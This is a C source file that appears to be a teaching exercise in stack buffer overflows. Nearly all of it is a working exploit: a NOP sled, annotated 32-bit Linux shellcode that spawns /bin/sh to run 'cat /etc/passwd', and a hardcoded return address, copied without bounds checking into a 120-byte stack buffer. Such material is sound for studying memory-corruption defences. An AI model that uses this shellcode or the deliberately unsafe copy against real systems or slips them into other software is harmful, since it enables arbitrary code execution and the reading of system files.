#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void doTest();

int main(int argc, char * argv[]){
    /* call the vulnerable function */
    doTest();

    exit(0);
}

// Sizeof code = 0x61
char compromise[145] = {
	// Padding bytes
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	// The exploit itself
	// 	 bits 32
	// 	 nop
	// 	 nop
	// start:   jmp short codeEnd
	// start2:  pop esi
	// 	 xor eax, eax
	// 	 mov [byte esi + flagStr - exeStr -2], al
	// 	 mov [byte esi + cmdStr - exeStr - 1], al
	// 	 mov [byte esi + arrayAddr - exeStr - 1], al
	// 	 mov [byte esi + arrayAddr - exeStr + 12], eax
	// 	 mov [byte esi+arrayAddr-exeStr+0], esi ; Copy /bin into array addr[0]
	// 	 lea edi, [byte esi + flagStr - exeStr] ; Copy -c into array addr[1]
	// 	 mov [byte esi+arrayAddr-exeStr+4], edi
	// 	 lea edi, [byte esi + cmdStr - exeStr] ; Copy cat into array addr[2]
	// 	 mov [byte esi+arrayAddr-exeStr+8], edi
	// 	 mov al, 0x0b
	// 	 mov ebx, esi
	// 	 lea ecx, [byte esi + arrayAddr - exeStr]
	// 	 xor edx, edx
	// 	 int 0x80
	// codeEnd: call start2
	// exeStr:  db "/bin/shXy"
	// flagStr: db "-cX"
	// cmdStr:  db "cat /etc/passwd;exitX"
	// arrayAddr: dd 0xffffffff
	// 	 dd 0xffffffff
	// 	 dd 0xffffffff
	// 	 dd 0xffffffff
	// newAddr: dd newAddr-start
	0x90, 0xeb, 0x29, 0x5e, 0x31, 0xc0, 0x88, 0x46, 0x07, 0x88, 0x46, 0x0b, 0x88, 0x46, 0x20, 0x89,
	0x46, 0x2d, 0x89, 0x76, 0x21, 0x8d, 0x7e, 0x09, 0x89, 0x7e, 0x25, 0x8d, 0x7e, 0x0c, 0x89, 0x7e,
	0x29, 0xb0, 0x0b, 0x89, 0xf3, 0x8d, 0x4e, 0x21, 0x31, 0xd2, 0xcd, 0x80, 0xe8, 0xd2, 0xff, 0xff,
	0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x58, 0x79, 0x2d, 0x63, 0x58, 0x63, 0x61, 0x74,
	0x20, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x3b, 0x65, 0x78, 0x69,
	0x74, 0x58, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff,
	// Stack pointer address: 0xbffff420
	// Sizeof Code: 0x61
	// Return address: = 0xbffff420 - 0x61 - 0x04
	0xbb, 0xf3, 0xff, 0xbf,
	// Null terminating character
	0x00
};

char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "WXYZ";

int i;
void doTest(){
    char buffer[120];

    for (i = 0; compromise[i]; i++)
	buffer[i] = compromise[i];
}
